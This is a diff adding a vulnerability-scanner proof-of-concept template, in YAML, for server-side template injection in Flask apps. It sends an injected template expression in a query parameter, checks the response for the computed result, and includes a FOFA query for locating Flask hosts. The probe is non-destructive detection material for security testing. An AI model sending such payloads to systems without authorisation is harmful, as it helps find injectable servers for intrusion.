@@ -1,0 +1,18 @@
+id: poc-yaml-flask-ssti
+info:
+  name: flask ssti 服务端模版注入
+  severity: high
+  tags:
+  - ssti
+  finger: flask
+  fofa: app="flask"
+requests:
+- method: GET
+  path: /?name=Hello%20%7b%7b1233*3321%7d%7d
+  expression: 'status_code == 200 &&
+
+    contains(body,"Hello 4094793")
+
+    '
+variables: {}
+transport: http
